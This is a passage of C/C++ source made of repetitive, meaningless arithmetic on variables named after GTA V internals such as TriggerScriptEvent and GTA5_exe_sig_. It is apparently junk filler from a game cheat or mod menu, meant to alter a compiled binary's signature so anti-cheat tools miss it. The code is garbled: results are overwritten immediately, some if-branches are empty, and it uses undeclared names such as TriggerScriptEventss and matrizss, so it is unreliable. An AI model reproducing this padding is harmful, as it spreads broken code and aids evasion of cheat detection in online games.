			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			char buffer[5000];

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
